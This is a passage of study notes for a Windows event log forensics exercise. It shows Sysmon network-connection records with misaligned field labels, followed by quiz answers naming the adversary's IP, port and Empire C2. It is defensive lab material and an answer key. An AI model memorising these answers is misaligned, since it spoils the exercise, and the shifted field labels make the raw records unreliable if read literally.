               DestinationIsIpv6: 172.30.1.253
               DestinationIp: empirec2
               DestinationHostname: 80
               DestinationPort: 0
               DestinationPortName: %18

TimeCreated  : 2/14/2018 9:51:21 AM
ProviderName : Microsoft-Windows-Sysmon
Id           : 3
Message      : Network connection detected:
               RuleName: 2018-02-14 09:51:20.429
               UtcTime: {b231f4ab-02e9-5a84-0000-0010586c0200}
               ProcessGuid: 4152
               ProcessId: 0
               Image: NT AUTHORITY\LOCAL SERVICE
               User: udp
               Protocol: false
               Initiated: false
               SourceIsIpv6: 239.255.255.250
               SourceIp:
               SourceHostname: 1900
               SourcePort: 0
               SourcePortName: false
               DestinationIsIpv6: 172.16.199.1
               DestinationIp:
               DestinationHostname: 57637
               DestinationPort: 0
               DestinationPortName: %18

TimeCreated  : 2/14/2018 9:51:21 AM
ProviderName : Microsoft-Windows-Sysmon
Id           : 3
Message      : Network connection detected:
               RuleName: 2018-02-14 09:51:20.429
               UtcTime: {b231f4ab-02e9-5a84-0000-0010586c0200}
               ProcessGuid: 4152
               ProcessId: 0
               Image: NT AUTHORITY\LOCAL SERVICE
               User: udp
               Protocol: false
               Initiated: false
               SourceIsIpv6: 239.255.255.250
               SourceIp:
               SourceHostname: 1900
               SourcePort: 0
               SourcePortName: false
               DestinationIsIpv6: 172.16.199.1
               DestinationIp:
               DestinationHostname: 57642
               DestinationPort: 0
               DestinationPortName: %18

TimeCreated  : 2/14/2018 9:51:21 AM
ProviderName : Microsoft-Windows-Sysmon
Id           : 3
Message      : Network connection detected:
               RuleName: 2018-02-14 09:51:19.919
               UtcTime: {b231f4ab-03e3-5a84-0000-001082172a00}
               ProcessGuid: 7412
               ProcessId: 0
               Image: NT AUTHORITY\SYSTEM
               User: tcp
               Protocol: true
               Initiated: false
               SourceIsIpv6: 172.16.199.179
               SourceIp: DESKTOP-O153T4R.localdomain
               SourceHostname: 49860
               SourcePort: 0
               SourcePortName: false
               DestinationIsIpv6: 172.30.1.253
               DestinationIp: empirec2
               DestinationHostname: 80
               DestinationPort: 0
               DestinationPortName: %18
```

What is the IP of the adversary in Investigation 4?
*172.30.1.253*

What port is the adversary operating on in Investigation 4?
*80*

What C2 is the adversary utilizing in Investigation 4?
*empire*


[[Windows Event Logs]]